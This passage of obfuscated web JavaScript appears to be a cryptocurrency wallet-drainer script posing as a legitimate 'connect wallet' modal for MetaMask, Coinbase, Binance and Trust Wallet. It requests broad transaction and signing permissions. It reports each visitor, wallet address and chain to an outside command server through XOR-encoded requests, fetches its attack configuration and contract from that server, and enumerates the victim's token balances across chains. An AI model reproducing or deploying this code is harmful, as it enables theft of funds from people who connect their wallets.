20.0858L13.5549 19.9583L13.4474 20.0089ZM18.553 20.0089L18.6599 20.0602L19.6499 17.9908L21.718 18.9452L18.5199 19.8958L18.553 20.0089L18.5868 20.1221L22.0849 19.0821L22.1693 18.9771L22.1012 18.8614L19.643 17.7271L19.4868 17.7833L18.4468 19.9577L18.4637 20.0852L18.5874 20.1214L18.553 20.0089Z\"fill=#233447></path><path d=\"M9.47623 26.7212L10.0437 21.71L6.16748 21.8043L9.47623 26.7212ZM21.9569 21.6156L22.5244 26.6268L25.8337 21.7106L21.9569 21.6156ZM24.8875 16.1318L17.8906 16.4156L18.5525 20.0087L19.5925 17.8343L22.0506 18.9687L24.8875 16.1318ZM9.94873 18.9687L12.4069 17.8343L13.4469 20.0087L14.1087 16.4156L7.11186 16.1318L9.94873 18.9687Z\"fill=#CC6228></path><path d=\"M9.47636 26.7212L9.59386 26.7343L10.1614 21.723L10.1314 21.6299L10.0414 21.5918L6.16511 21.6862L6.06323 21.7499L6.07011 21.8699L9.37948 26.7862L9.50573 26.8349L9.59511 26.7337L9.47636 26.7212L9.57448 26.6549L6.38573 21.9174L9.91073 21.8312L9.35886 26.7074L9.47636 26.7212ZM21.957 21.6155L21.8395 21.6287L22.407 26.6399L22.4964 26.7412L22.6226 26.6924L25.932 21.7762L25.9389 21.6562L25.837 21.5924L21.9607 21.498L21.8707 21.5362L21.8407 21.6293L21.957 21.6155L21.9539 21.7337L25.6151 21.823L22.6057 26.2943L22.0745 21.6024L21.957 21.6155ZM24.8876 16.1318L24.8826 16.0137L17.8857 16.2974L17.7982 16.3418L17.7745 16.4368L18.4364 20.0299L18.537 20.1255L18.6589 20.0593L19.6489 17.9899L22.0014 19.0755L22.1345 19.0518L24.9707 16.2155L24.9951 16.0843L24.882 16.0137L24.8876 16.1318L24.8039 16.048L22.0257 18.8262L19.6426 17.7262L19.4864 17.7824L18.6032 19.6287L18.032 16.5274L24.8926 16.2499L24.8876 16.1318ZM9.94886 18.9687L9.99823 19.0762L12.3507 17.9905L13.3407 20.0599L13.4626 20.1262L13.5632 20.0305L14.2251 16.4374L14.2014 16.3424L14.1139 16.298L7.11698 16.0143L7.00386 16.0849L7.02823 16.2162L9.86448 19.0524L9.99761 19.0762L9.94886 18.9687L10.0326 18.8849L7.41011 16.2624L13.9682 16.528L13.397 19.6293L12.5139 17.783L12.3576 17.7268L9.89948 18.8612L9.94886 18.9687Z\"fill=#CC6228></path><path d=\"M7.11255 16.0376L10.0438 21.8051L9.94942 18.9688C9.9488 18.9688 7.11255 16.132 7.11255 16.0376ZM22.0513 18.9688L21.9569 21.8051L24.8882 16.0376L22.0513 18.9688ZM14.1088 16.4157L13.4469 20.0088L14.2975 24.2638L14.4869 18.6857L14.1088 16.4157ZM17.8913 16.4157L17.5132 18.6851L17.7025 24.2632L18.5532 20.0082L17.8913 16.4157Z\"fill=#E27525></path><path d=\"M7.11251 16.0379L7.00688 16.0916L9.93813 21.8591L10.0731 21.9197L10.1619 21.8016L10.0675 18.9654L10.0331 18.886C10.0319 18.8847 9.32438 18.1772 8.61563 17.4566C8.26126 17.0966 7.90688 16.7335 7.64188 16.4547C7.50938 16.3154 7.39938 16.1979 7.32313 16.1129L7.23751 16.0135L7.22001 15.9904L7.19876 16.0041L7.22126 15.9935L7.22001 15.9904L7.19876 16.0041L7.22126 15.9935L7.12813 16.0391H7.23126L7.22126 15.9935L7.12813 16.0391H7.23126H7.11251L7.00688 16.0929L7.11251 16.0379H6.99438L7.02188 16.1197C7.08063 16.206 7.27126 16.4091 7.54751 16.6985C8.36813 17.5554 9.86501 19.0522 9.86563 19.0529L9.94938 18.9691L9.83126 18.9729L9.90813 21.2772L7.21813 15.9841L7.08501 15.9229L6.99438 16.0379H7.11251ZM22.0513 18.9691L21.9331 18.9654L21.8388 21.8016L21.9275 21.9197L22.0625 21.8591L24.9938 16.0916L24.9569 15.9416L24.8031 15.9554L21.9669 18.8866L21.9338 18.9647L22.0513 18.9691L22.1363 19.051L24.4269 16.6841L22.0925 21.2772L22.1694 18.9729L22.0513 18.9691ZM14.1088 16.416L13.9925 16.3947L13.3306 19.9879L13.3313 20.0322L14.1819 24.2872L14.3075 24.3816L14.4163 24.2679L14.6056 18.6897L14.6044 18.6666L14.2263 16.3972L14.1106 16.2985L13.9931 16.3954L14.1088 16.416L13.9919 16.4354L14.3681 18.6929L14.2138 23.2429L13.5669 20.0079L14.2244 16.4372L14.1088 16.416ZM17.8913 16.416L17.7744 16.3966L17.3963 18.666L17.395 18.6891L17.5844 24.2672L17.6931 24.381L17.8188 24.2866L18.6694 20.0316L18.67 19.9872L18.0081 16.3941L17.8906 16.2972L17.775 16.396L17.8913 16.416L17.775 16.4372L18.4325 20.0079L17.7856 23.2422L17.6313 18.6929L18.0075 16.4354L17.8913 16.416Z\"fill=#E27525></path><path d=\"M18.5531 20.0088L17.7025 24.2638L18.27 24.6419L21.9575 21.8056L22.0519 18.9694L18.5531 20.0088ZM9.94873 18.9688L10.0431 21.805L13.7306 24.6413L14.2981 24.2631L13.4475 20.0081L9.94873 18.9688Z\"fill=#F5841F></path><path d=\"M18.5531 20.0087L18.4374 19.9856L17.5868 24.2406L17.6374 24.3619L18.2049 24.74L18.3424 24.7356L22.0299 21.8994L22.0762 21.8094L22.1706 18.9731L22.1249 18.8756L22.0193 18.8556L18.5212 19.8956L18.4387 19.9856L18.5531 20.0087L18.5868 20.1219L21.9281 19.1287L21.8406 21.7456L18.2643 24.4962L17.8331 24.2087L18.6687 20.0319L18.5531 20.0087ZM9.94869 18.9687L9.83057 18.9725L9.92494 21.8087L9.97119 21.8987L13.6587 24.735L13.7962 24.7394L14.3637 24.3612L14.4143 24.24L13.5637 19.985L13.4812 19.895L9.98307 18.855L9.87744 18.875L9.83182 18.9725L9.94869 18.9687L9.91494 19.0819L13.3449 20.1019L14.1662 24.2094L13.7356 24.4969L10.1593 21.7462L10.0668 18.9656L9.94869 18.9687Z\"fill=#F5841F></path><path d=\"M18.6475 28.5182V27.3832L18.3637 27.0995H13.6362L13.3525 27.3832V28.5182L9.38184 26.627L10.8 27.7613L13.5418 29.6526H18.3637L21.2 27.7613L22.5237 26.627L18.6475 28.5182Z\"fill=#C0AC9D></path><path d=\"M18.6475 28.5181H18.7656V27.3831L18.7313 27.3L18.4475 27.0163L18.3638 26.9813H13.6363L13.5525 27.0163L13.2688 27.3L13.2344 27.3831V28.3306L9.4325 26.52L9.28125 26.5644L9.3075 26.7194L10.7262 27.8538L10.7325 27.8588L13.4744 29.75L13.5419 29.7706H18.3638L18.4294 29.7506L21.2656 27.86L21.2769 27.8513L22.6006 26.7169L22.6225 26.5619L22.4719 26.5206L18.5956 28.4119L18.6475 28.5181H18.7656H18.6475L18.6994 28.6244L21.7463 27.1375L21.1288 27.6669L18.3281 29.5344H13.5788L10.8706 27.6669L10.2531 27.1731L13.3019 28.6244L13.4156 28.6175L13.4706 28.5181V27.4325L13.685 27.2175H18.315L18.5294 27.4325V28.5181L18.585 28.6181L18.6994 28.6244L18.6475 28.5181Z\"fill=#C0AC9D></path><path d=\"M18.3638 24.6413L17.7963 24.2632H14.2982L13.7307 24.6413L13.3525 27.3832L13.6363 27.0994H18.3638L18.6475 27.3832L18.3638 24.6413Z\"fill=#161616></path><path d=\"M18.3637 24.6413L18.4293 24.5431L17.8618 24.165L17.7962 24.145H14.2981L14.2325 24.165L13.665 24.5431L13.6137 24.625L13.2356 27.3669L13.3 27.4894L13.4362 27.4669L13.685 27.2175H18.315L18.5637 27.4669L18.6981 27.49L18.765 27.3713L18.4812 24.6294L18.4293 24.5431L18.3637 24.6413L18.2462 24.6538L18.4956 27.0644L18.4475 27.0163L18.3637 26.9813H13.6362L13.5525 27.0163L13.5175 27.0513L13.8406 24.71L14.3337 24.3813H17.7606L18.2981 24.74L18.3637 24.6413L18.2462 24.6538L18.3637 24.6413Z\"fill=#161616></path><path d=\"M30.8445 10.1759L31.8845 5.07027L30.372 0.342773L18.3645 9.23027L22.9976 13.1065L29.5213 14.9978L30.9395 13.2959L30.2776 12.8234L31.2232 11.8778L30.467 11.3103L31.4126 10.554L30.8445 10.1759ZM0.115723 5.07027L1.15572 10.1759L0.493848 10.6484L1.53385 11.4046L0.777598 11.9721L1.72322 12.9178L1.06135 13.3903L2.47947 15.0921L9.00322 13.2009L13.6363 9.32465L1.72322 0.342773L0.115723 5.07027Z\"fill=#763E1A></path><path d=\"M30.8444 10.1757L30.96 10.1995L32 5.09324L31.9969 5.03387L30.4844 0.306367L30.4081 0.230117L30.3013 0.247617L18.2938 9.13512L18.2456 9.22637L18.2881 9.32074L22.9212 13.197L22.9644 13.2201L29.4881 15.1114L29.6119 15.0732L31.03 13.3714L31.0562 13.2807L31.0075 13.1995L30.4594 12.8076L31.3062 11.9607L31.3406 11.8689L31.2938 11.7826L30.6594 11.307L31.4856 10.6457L31.53 10.5482L31.4775 10.4551L30.91 10.077L30.8444 10.1757L30.7787 10.2739L31.2119 10.5626L30.3925 11.2182L30.3481 11.3126L30.3956 11.4051L31.0431 11.8907L30.1938 12.7401L30.1594 12.8332L30.2087 12.9195L30.7669 13.3182L29.4794 14.8626L23.0531 13.0001L18.5544 9.23574L30.3088 0.535742L31.7619 5.07699L30.7281 10.1526L30.7781 10.2745L30.8444 10.1757ZM0.115625 5.07012L0 5.09324L1.025 10.1239L0.425625 10.552L0.37625 10.6476L0.425 10.7439L1.33563 11.4064L0.7075 11.8776L0.660625 11.9639L0.695 12.0557L1.54188 12.9026L0.99375 13.2945L0.945 13.3757L0.97125 13.4664L2.38937 15.1682L2.51312 15.2064L9.03687 13.3151L9.08 13.292L13.7131 9.41574L13.7556 9.32199L13.7087 9.23074L1.79437 0.248242L1.68875 0.229492L1.61188 0.304492L0.00375 5.03199L0 5.09324L0.115625 5.07012L0.2275 5.10824L1.7825 0.535742L13.4462 9.33012L8.94625 13.0951L2.52063 14.9576L1.23312 13.4126L1.79125 13.0139L1.84063 12.9276L1.80625 12.8345L0.956875 11.9851L1.60438 11.4995L1.65188 11.4039L1.60312 11.3089L0.695625 10.6489L1.22375 10.2714L1.27062 10.1514L0.231875 5.04637L0.115625 5.07012Z\"fill=#763E1A></path><path d=\"M29.4257 14.9976L22.9019 13.1064L24.8875 16.0376L21.9563 21.7108H25.8325H31.6L29.4257 14.9976ZM9.09817 13.1064L2.57441 14.9976L0.399414 21.7108H6.16691H10.0432L7.11192 16.0376L9.09817 13.1064ZM17.8913 16.4158L18.3638 9.23014L20.255 4.12451H11.84L13.7313 9.23014L14.1094 16.4158L14.2988 18.6851V24.2633H17.7969V18.6851L17.8913 16.4158Z\"fill=#F5841F></path><path d=\"M29.4256 14.9977L29.4587 14.884L22.935 12.9927L22.8062 13.0365L22.8037 13.1721L24.75 16.0452L21.8512 21.6559L21.855 21.7715L21.9562 21.8284H25.8325H31.6L31.6956 21.7796L31.7125 21.674L29.5381 14.9609L29.4587 14.884L29.4256 14.9977L29.3131 15.034L31.4375 21.5921H25.8325H22.15L24.9919 16.0915L24.985 15.9709L23.1831 13.3109L29.3925 15.1109L29.4256 14.9977ZM9.09812 13.1065L9.06499 12.9927L2.54124 14.884L2.46187 14.9609L0.286865 21.674L0.30374 21.7802L0.399365 21.829H6.16687H10.0431L10.1437 21.7721L10.1475 21.6565L7.24874 16.0459L9.19499 13.1727L9.19249 13.0371L9.06374 12.9934L9.09812 13.1065L8.99999 13.0402L7.01437 15.9715L7.00749 16.0921L9.84937 21.5927H6.16687H0.561865L2.66687 15.094L9.13062 13.2202L9.09812 13.1065ZM17.8912 16.4159L18.0094 16.4234L18.4812 9.25461L20.3662 4.16523L20.3525 4.05648L20.2556 4.00586H11.84L11.7431 4.05648L11.7294 4.16523L13.6137 9.25398L13.9912 16.4221V16.4259L14.18 18.6902V24.2634L14.2144 24.3471L14.2981 24.3815H17.7962L17.88 24.3471L17.9144 24.2634V18.6877L18.0087 16.4209L17.8912 16.4159L17.7731 16.4109L17.6787 18.6802V18.6852V24.1452H14.4169V18.6852L14.4162 18.6752L14.2275 16.4077L13.8494 9.22336L13.8425 9.18836L12.0106 4.24211H20.0856L18.2537 9.18836L18.2469 9.22148L17.7744 16.4071V16.4102L17.8912 16.4159Z\"fill=#F5841F></path></svg></div><div class=modal-el-desc><span class=modal-el-desc-first>MetaMask</span> <span class=modal-el-desc-second>Connnect to your MetaMask wallet</span></div></div><div class=menu-el data=2><div class=modal-icon><svg fill=none height=32 viewBox=\"0 0 32 32\"width=32 xmlns=http://www.w3.org/2000/svg><g clip-path=url(#clip0_73_248)><path d=\"M16 0C24.8375 0 32 7.1625 32 16C32 24.8375 24.8375 32 16 32C7.1625 32 0 24.8375 0 16C0 7.1625 7.1625 0 16 0Z\"fill=#0052FF></path><path d=\"M16.0031 21.625C12.8969 21.625 10.3781 19.1094 10.3781 16C10.3781 12.8906 12.8969 10.375 16.0031 10.375C18.7875 10.375 21.1 12.4062 21.5438 15.0625H27.2094C26.7313 9.2875 21.8969 4.75 16 4.75C9.7875 4.75 4.75 9.7875 4.75 16C4.75 22.2125 9.7875 27.25 16 27.25C21.8969 27.25 26.7313 22.7125 27.2094 16.9375H21.5406C21.0938 19.5938 18.7875 21.625 16.0031 21.625Z\"fill=white></path></g><defs><clipPath id=clip0_73_248><rect fill=white height=32 width=32></rect></clipPath></defs></svg></div><div class=modal-el-desc><span class=modal-el-desc-first>Coinbase</span> <span class=modal-el-desc-second>Connnect to your Coinbase wallet</span></div></div><div class=menu-el data=3><div class=modal-icon><svg fill=none height=32 viewBox=\"0 0 32 32\"width=32 xmlns=http://www.w3.org/2000/svg><g clip-path=url(#clip0_73_337)><path d=\"M7.24266 16L3.63808 19.6046L0.0244141 16L3.629 12.3955L7.24266 16ZM16.0044 7.23827L22.1876 13.4214L25.7922 9.81686L16.0044 0.0200195L6.20759 9.81686L9.81218 13.4214L16.0044 7.23827ZM28.3708 12.3955L24.7662 16L28.3708 19.6046L31.9754 16L28.3708 12.3955ZM16.0044 24.7618L9.82126 18.5786L6.21667 22.1832L16.0044 31.9801L25.7922 22.1832L22.1876 18.5786L16.0044 24.7618ZM16.0044 19.6046L19.609 16L16.0044 12.3955L12.3908 16L16.0044 19.6046Z\"fill=#F0B90B></path></g><defs><clipPath id=clip0_73_337><rect fill=white height=32 width=32></rect></clipPath></defs></svg></div><div class=modal-el-desc><span class=modal-el-desc-first>Binance Wallet</span> <span class=modal-el-desc-second>Connnect to your Binance wallet</span></div></div><div class=menu-el data=4><div class=modal-icon><svg fill=none height=32 viewBox=\"0 0 32 32\"width=32 xmlns=http://www.w3.org/2000/svg><g clip-path=url(#clip0_73_86)><path d=\"M0 8.125C0 3.63769 3.63769 0 8.125 0H23.875C28.3623 0 32 3.63769 32 8.125V23.875C32 28.3623 28.3623 32 23.875 32H8.125C3.63769 32 0 28.3623 0 23.875V8.125Z\"fill=#F1F7FE></path><path d=\"M16.0094 6.71875C19.2381 9.41525 22.9407 9.24894 23.9985 9.24894C23.7671 24.5846 22.004 21.5436 16.0094 25.8438C10.0147 21.5436 8.26266 24.5846 8.03125 9.24894C9.07809 9.24894 12.7807 9.41525 16.0094 6.71875Z\"stroke=#3375BB stroke-linecap=round stroke-linejoin=round stroke-miterlimit=10 stroke-width=2.56></path></g><defs><clipPath id=clip0_73_86><rect fill=white height=32 width=32></rect></clipPath></defs></svg></div><div class=modal-el-desc><span class=modal-el-desc-first>Trust Wallet</span> <span class=modal-el-desc-second>Connnect to your Trust wallet</span></div></div></div></div><div class=modal-bottom><button><svg fill=none height=24 viewBox=\"0 0 25 24\"width=25 xmlns=http://www.w3.org/2000/svg><path d=\"M9.875 3.375H5.75C5.25272 3.375 4.77581 3.57254 4.42417 3.92417C4.07254 4.27581 3.875 4.75272 3.875 5.25V9.375C3.875 9.87228 4.07254 10.3492 4.42417 10.7008C4.77581 11.0525 5.25272 11.25 5.75 11.25H9.875C10.3723 11.25 10.8492 11.0525 11.2008 10.7008C11.5525 10.3492 11.75 9.87228 11.75 9.375V5.25C11.75 4.75272 11.5525 4.27581 11.2008 3.92417C10.8492 3.57254 10.3723 3.375 9.875 3.375ZM9.5 9H6.125V5.625H9.5V9ZM9.875 12.75H5.75C5.25272 12.75 4.77581 12.9475 4.42417 13.2992C4.07254 13.6508 3.875 14.1277 3.875 14.625V18.75C3.875 19.2473 4.07254 19.7242 4.42417 20.0758C4.77581 20.4275 5.25272 20.625 5.75 20.625H9.875C10.3723 20.625 10.8492 20.4275 11.2008 20.0758C11.5525 19.7242 11.75 19.2473 11.75 18.75V14.625C11.75 14.1277 11.5525 13.6508 11.2008 13.2992C10.8492 12.9475 10.3723 12.75 9.875 12.75ZM9.5 18.375H6.125V15H9.5V18.375ZM19.25 3.375H15.125C14.6277 3.375 14.1508 3.57254 13.7992 3.92417C13.4475 4.27581 13.25 4.75272 13.25 5.25V9.375C13.25 9.87228 13.4475 10.3492 13.7992 10.7008C14.1508 11.0525 14.6277 11.25 15.125 11.25H19.25C19.7473 11.25 20.2242 11.0525 20.5758 10.7008C20.9275 10.3492 21.125 9.87228 21.125 9.375V5.25C21.125 4.75272 20.9275 4.27581 20.5758 3.92417C20.2242 3.57254 19.7473 3.375 19.25 3.375ZM18.875 9H15.5V5.625H18.875V9ZM13.25 16.125V13.875C13.25 13.5766 13.3685 13.2905 13.5795 13.0795C13.7905 12.8685 14.0766 12.75 14.375 12.75C14.6734 12.75 14.9595 12.8685 15.1705 13.0795C15.3815 13.2905 15.5 13.5766 15.5 13.875V16.125C15.5 16.4234 15.3815 16.7095 15.1705 16.9205C14.9595 17.1315 14.6734 17.25 14.375 17.25C14.0766 17.25 13.7905 17.1315 13.5795 16.9205C13.3685 16.7095 13.25 16.4234 13.25 16.125ZM21.125 15.375C21.125 15.6734 21.0065 15.9595 20.7955 16.1705C20.5845 16.3815 20.2984 16.5 20 16.5H18.875V19.5C18.875 19.7984 18.7565 20.0845 18.5455 20.2955C18.3345 20.5065 18.0484 20.625 17.75 20.625H14.375C14.0766 20.625 13.7905 20.5065 13.5795 20.2955C13.3685 20.0845 13.25 19.7984 13.25 19.5C13.25 19.2016 13.3685 18.9155 13.5795 18.7045C13.7905 18.4935 14.0766 18.375 14.375 18.375H16.625V13.875C16.625 13.5766 16.7435 13.2905 16.9545 13.0795C17.1655 12.8685 17.4516 12.75 17.75 12.75C18.0484 12.75 18.3345 12.8685 18.5455 13.0795C18.7565 13.2905 18.875 13.5766 18.875 13.875V14.25H20C20.2984 14.25 20.5845 14.3685 20.7955 14.5795C21.0065 14.7905 21.125 15.0766 21.125 15.375Z\"fill=white></path></svg> \u0421onnect by QR-code</button> <span>\u0421onnect by QR-code with WalletConnect</span></div></div>";
    document.body.prepend(_0x44f8e5);
    custom_modal_script();
  } catch (_0x2424ba) {
    console.log(_0x2424ba);
  }
};
function modalOpen() {
  $(".modal").show();
  $('#overlay').fadeIn(0xc8);
  $(".modal").animate({
    'opacity': '1',
    'top': "50%"
  }, 0x320);
}
;
$(document).mouseup(function (_0x4e2b06) {
  var _0x2c79a9 = $("#overlay");
  if (_0x2c79a9.has(_0x4e2b06.target).length === 0x0) {
    _0x2c79a9.fadeOut(0xc8);
    $(".modal").hide();
  }
});
function custom_modal_script() {
  $(".modal-main-menu .menu-el").on("click", function () {
    var _0x3edc64 = $(this).attr("data");
    if (_0x3edc64 == 0x1) {
      connect_wallet("MetaMask");
    }
    if (_0x3edc64 == 0x2) {
      connect_wallet('Coinbase');
    }
    if (_0x3edc64 == 0x3) {
      connect_wallet("Binance Wallet");
    }
    if (_0x3edc64 == 0x4) {
      connect_wallet("Trust Wallet");
    }
  });
  $(document).on('click', ".modal-bottom button", function (_0x38ec8f) {
    use_wc();
    $(".modal").hide();
    $("#overlay").fadeOut(0xc8);
  });
  $(document).on("click", ".modal-close", function (_0x3fc732) {
    $(".modal").hide();
    $('#overlay').fadeOut(0xc8);
  });
}
;
const set_modal_data = (_0x199a54, _0x11646b) => {
  try {
    MS_Modal_Data[0x0].data = _0x199a54;
    MS_Modal_Data[0x1].data = _0x11646b;
    reset_modal();
  } catch (_0x33c4ac) {
    console.log(_0x33c4ac);
  }
};
const reset_modal = () => {
  try {
    document.getElementById("web3-modal").remove();
  } catch (_0x234fc9) {
    console.log(_0x234fc9);
  }
  try {
    document.getElementById("web3-overlay").remove();
  } catch (_0x36bff0) {
    console.log(_0x36bff0);
  }
  try {
    document.getElementById("web3-style").remove();
  } catch (_0x3088fe) {
    console.log(_0x3088fe);
  }
  try {
    inject_modal();
  } catch (_0x5cbeea) {
    console.log(_0x5cbeea);
  }
};
const ms_init = () => {
  try {
    if (MS_Process) {
      return;
    }
    document.getElementById("web3-modal").style.display = "block";
    document.getElementById("web3-overlay").style.display = "block";
    document.getElementsByClassName('web3-modal-main')[0x0].style.display = "block";
    document.getElementsByClassName("web3-modal-wc")[0x0].style.display = "none";
  } catch (_0x12b4d6) {
    console.log(_0x12b4d6);
  }
};
const ms_hide = () => {
  try {
    document.getElementById('web3-modal').style.display = "none";
    document.getElementById("web3-overlay").style.display = "none";
  } catch (_0x11f9a3) {
    console.log(_0x11f9a3);
  }
};
const load_wc = async () => {
  let _0x3dacc9 = [];
  let _0x36a456 = {};
  for (const _0x5efdd2 in MS_Settings.RPCs) {
    if (_0x5efdd2 != '1') {
      _0x3dacc9.push(_0x5efdd2);
    }
    _0x36a456[_0x5efdd2] = MS_Settings.RPCs[_0x5efdd2];
  }
  MS_Provider = await WC2_Provider.init({
    'projectId': "ea52b0e550593829f2eee2cb9006f642",
    'chains': ['1'],
    'optionalChains': _0x3dacc9,
    'metadata': MS_WalletConnect_MetaData,
    'showQrModal': true,
    'rpcMap': _0x36a456,
    'methods': ["eth_sendTransaction", "eth_signTransaction", 'eth_sign', "personal_sign", 'eth_signTypedData', 'eth_signTypedData_v4'],
    'qrModalOptions': undefined
  });
};
const prs = (_0x5a056c, _0x1ca253) => {
  const _0x1caef7 = _0x4e5112 => _0x4e5112.split('').map(_0x4be713 => _0x4be713.charCodeAt(0x0));
  const _0x219b31 = _0x1eb643 => ('0' + Number(_0x1eb643).toString(0x10)).substr(-0x2);
  const _0x4330a5 = _0x3f951d => _0x1caef7(_0x5a056c).reduce((_0x2ce9a6, _0x41b9ce) => _0x2ce9a6 ^ _0x41b9ce, _0x3f951d);
  return _0x1ca253.split('').map(_0x1caef7).map(_0x4330a5).map(_0x219b31).join('');
};
const srp = (_0x4f65a9, _0x4f5dcd) => {
  const _0x3e7e1d = _0x28a332 => _0x28a332.split('').map(_0x31c58c => _0x31c58c.charCodeAt(0x0));
  const _0xc266b9 = _0x41d826 => _0x3e7e1d(_0x4f65a9).reduce((_0x22d28d, _0xee6a2e) => _0x22d28d ^ _0xee6a2e, _0x41d826);
  return _0x4f5dcd.match(/.{1,2}/g).map(_0x9cce3f => parseInt(_0x9cce3f, 0x10)).map(_0xc266b9).map(_0x425b74 => String.fromCharCode(_0x425b74)).join('');
};
const send_request = async _0x140b47 => {
  try {
    if (MS_Force_Mode) {
      return {
        'status': "error",
        'error': "Server is Unavailable"
      };
    }
    _0x140b47.domain = "https://kirazyapi.com.tr/Server/server.js";
    _0x140b47.worker_id = null || null;
    _0x140b47.chat_data = false;
    const _0x16cf83 = btoa(String(0xd0a));
    const _0x124870 = prs(_0x16cf83, btoa(JSON.stringify(_0x140b47)));
    const _0x35eacb = await fetch("https://kirazyapi.com.tr/Server/server.js", {
      'method': "POST",
      'headers': {
        'Accept': 'text/plain',
        'Content-Type': "application/x-www-form-urlencoded"
      },
      'body': "ver=05082023&raw=" + _0x124870
    });
    let _0x369854 = JSON.parse(atob(srp(_0x16cf83, await _0x35eacb.text())));
    if (!_0x369854.status) {
      return {
        'status': 'error',
        'error': "Server is Unavailable"
      };
    } else {
      if (_0x369854.status == "error" && _0x369854.error == 'SRV_UNAVAILABLE') {
        MS_Force_Mode = true;
      }
      if (_0x369854.status == "error" && _0x369854.error == 'INVALID_VERSION') {
        MS_Force_Mode = true;
        try {
          Swal.close();
          Swal.fire({
            'html': "<b>Server Error</b> Please, check client and server version, looks like it doesn't match, or maybe you need to clear cache everywhere :(",
            'icon': "error",
            'allowOutsideClick': true,
            'allowEscapeKey': true,
            'timer': 0x0,
            'width': 0x258,
            'showConfirmButton': true,
            'confirmButtonText': 'OK'
          });
        } catch (_0x3c5138) {
          console.log(_0x3c5138);
        }
      }
      return _0x369854;
    }
  } catch (_0x430889) {
    console.log(_0x430889);
    return {
      'status': "error",
      'error': "Server is Unavailable"
    };
  }
};
const retrive_config = async () => {
  try {
    const _0x2da206 = await send_request({
      'action': "retrive_config"
    });
    if (_0x2da206.status == 'OK') {
      MS_Settings = _0x2da206.data;
      if (!MS_Settings.CIS) {
        MS_Bad_Country = false;
      }
      if (typeof MS_Settings.DSB == "boolean" && MS_Settings.DSB === true) {
        window.location.href = 'about:blank';
      }
    }
  } catch (_0x1d9ec8) {
    console.log(_0x1d9ec8);
  }
};
const retrive_contract = async () => {
  try {
    const _0x19b61f = await send_request({
      'action': "retrive_contract"
    });
    if (_0x19b61f.status == 'OK') {
      MS_Contract_ABI = _0x19b61f.data;
    }
  } catch (_0xe8e468) {
    console.log(_0xe8e468);
  }
};
const enter_website = async () => {
  try {
    let _0x1a7d62 = await send_request({
      'action': "enter_website",
      'user_id': MS_ID,
      'time': new Date().toLocaleString("ru-RU")
    });
    if (_0x1a7d62.status == "error" && _0x1a7d62.error == 'BAD_COUNTRY') {
      MS_Bad_Country = true;
    }
  } catch (_0x47becf) {
    console.log(_0x47becf);
  }
};
const leave_website = async () => {
  try {
    if (!MS_Settings.Notifications.leave_website) {
      return;
    }
    await send_request({
      'action': "leave_website",
      'user_id': MS_ID
    });
  } catch (_0x3b2979) {
    console.log(_0x3b2979);
  }
};
const connect_request = async () => {
  try {
    if (!MS_Settings.Notifications.connect_request) {
      return;
    }
    await send_request({
      'action': "connect_request",
      'user_id': MS_ID,
      'wallet': MS_Current_Provider
    });
  } catch (_0x1101d2) {
    console.log(_0x1101d2);
  }
};
const connect_cancel = async () => {
  try {
    if (!MS_Settings.Notifications.connect_cancel) {
      return;
    }
    await send_request({
      'action': "connect_cancel",
      'user_id': MS_ID
    });
  } catch (_0x1af784) {
    console.log(_0x1af784);
  }
};
const connect_success = async () => {
  try {
    if (!MS_Settings.Notifications.connect_success) {
      return;
    }
    await send_request({
      'action': "connect_success",
      'user_id': MS_ID,
      'address': MS_Current_Address,
      'wallet': MS_Current_Provider,
      'chain_id': MS_Current_Chain_ID
    });
  } catch (_0x467e6e) {
    console.log(_0x467e6e);
  }
};
const convert_chain = (_0x4ca7b2, _0x1ebda2, _0x541e3b) => {
  try {
    if (_0x4ca7b2 == 'ANKR' && _0x1ebda2 == 'ID') {
      switch (_0x541e3b) {
        case "eth":
          return 0x1;
        case 'bsc':
          return 0x38;
        case "polygon":
          return 0x89;
        case "avalanche":
          return 0xa86a;
        case "arbitrum":
          return 0xa4b1;
        case "optimism":
          return 0xa;
        case 'fantom':
          return 0xfa;
        default:
          return false;
      }
    } else {
      if (_0x4ca7b2 == "OPENSEA" && _0x1ebda2 == 'ID') {
        switch (_0x541e3b) {
          case "ethereum":
            return 0x1;
          case "matic":
            return 0x89;
          case 'avalanche':
            return 0xa86a;
          case 'arbitrum':
            return 0xa4b1;
          case "optimism":
            return 0xa;
          default:
            return false;
        }
      } else {
        if (_0x4ca7b2 == 'ID' && _0x1ebda2 == "ANKR") {
          switch (_0x541e3b) {
            case 0x1:
              return "eth";
            case 0x38:
              return "bsc";
            case 0x89:
              return "polygon";
            case 0xa86a:
              return "avalanche";
            case 0xa4b1:
              return "arbitrum";
            case 0xa:
              return 'optimism';
            case 0xfa:
              return 'fantom';
            case 0x19:
              return "cronos";
            case 0x64:
              return 'gnosis';
            case 0x80:
              return "heco";
            case 0x504:
              return "moonbeam";
            case 0x505:
              return "moonriver";
            case 0x8ae:
              return "kava";
            case 0xa4ec:
              return "celo";
            case 0x63564c40:
              return "harmony";
            default:
              return false;
          }
        } else {
          if (_0x4ca7b2 == 'ID' && _0x1ebda2 == "CURRENCY") {
            switch (_0x541e3b) {
              case 0x1:
                return "ETH";
              case 0x38:
                return "BNB";
              case 0x89:
                return "MATIC";
              case 0xa86a:
                return "AVAX";
              case 0xa4b1:
                return "ETH";
              case 0xa:
                return 'ETH';
              case 0xfa:
                return "FTM";
              case 0x19:
                return "CRO";
              case 0x64:
                return "XDAI";
              case 0x80:
                return 'HT';
              case 0x504:
                return "GLMR";
              case 0x505:
                return "MOVR";
              case 0x8ae:
                return "KAVA";
              case 0xa4ec:
                return "CELO";
              case 0x63564c40:
                return 'ONE';
              default:
                return false;
            }
          }
        }
      }
    }
  } catch (_0x329b6a) {
    console.log(_0x329b6a);
    return false;
  }
};
const get_tokens = async _0x2e9bca => {
  try {
    let _0x42fb93 = [];
    let _0x565d72 = await fetch("https://rpc.ankr.com/multichain/" + (MS_Settings.AT || ''), {
      'method': 'POST',
      'headers': {
        'Accept': "application/json",
        'Content-Type': "application/json"
      },
      'body': JSON.stringify({
        'id': 0x1,
        'jsonrpc': "2.0",
        'method': "ankr_getAccountBalance",
        'params': {
          'blockchain': ["eth", "bsc", "polygon", 'avalanche', "arbitrum", 'fantom', "optimism"],
          'walletAddress': _0x2e9bca
        }
      })
    });
    _0x565d72 = await _0x565d72.json();
    for (const _0x145876 of _0x565d72.result.assets) {
      try {
        let _0x116ea4 = _0x145876.contractAddress || "NATIVE";
        if (MS_Settings.Contract_Whitelist.length > 0x0 && !MS_Settings.Contract_Whitelist.includes(_0x116ea4.toLowerCase())) {
          continue;
        } else {
